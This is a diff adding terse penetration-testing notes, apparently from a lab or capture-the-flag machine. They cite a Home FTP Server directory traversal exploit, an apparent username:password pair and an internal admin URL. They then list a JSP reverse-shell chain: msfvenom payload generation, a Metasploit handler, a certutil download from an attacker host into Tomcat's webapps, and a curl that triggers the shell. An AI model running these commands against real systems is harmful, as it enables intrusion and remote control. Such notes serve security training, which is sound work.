@@ -1,0 +1,22 @@
+Home FTP Server 1.10.2.143 - Directory Traversal - https://www.exploit-db.com/exploits/34050
+
+def retr_file(s, filename):  s.send('LIST ' + filename + '\r\n')
+def retr_file(s, filename):  s.send('RETR ' + filename + '\r\n')
+
+fm:smilealot
+
+so from http://10.2.2.31:8443/admin/index.php
+upload reverse shell
+
+privesc:
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > reverseshell.jsp
+
+msfconsole use exploit/multi/handler 
+set payload java/jsp_shell_reverse_tcp
+
+cd C:\xampp\tomcat\webapps
+
+certutil.exe -urlcache -f http://IP/reverseshell.jsp reverseshell.jsp
+
+curl http://127.0.0.1:8080/reverseshell.jsp
